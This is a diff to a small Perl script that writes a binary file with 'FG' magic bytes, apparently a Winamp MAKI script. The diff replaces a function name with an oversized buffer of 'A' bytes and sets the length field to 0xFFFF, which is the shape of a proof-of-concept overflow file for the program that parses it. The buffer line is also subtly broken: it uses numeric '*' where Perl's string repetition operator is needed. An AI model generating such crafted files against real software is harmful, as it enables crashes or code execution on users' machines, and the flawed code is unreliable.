@@ -5,7 +5,7 @@ binmode STDOUT;
 $| = 1;
 
 $length = "\xFF\xFF";
-$function_name = "HelloWorld";
+$buffer = "\x41" * 20000;
 
 my $maki =
 "\x46\x47" .                              # Magic
@@ -20,6 +20,6 @@ my $maki =
 "\x00\x00" .                              # Dummy
 
 $length .                                 # Length
-$function_name;
+$buffer;
 
 print $maki;
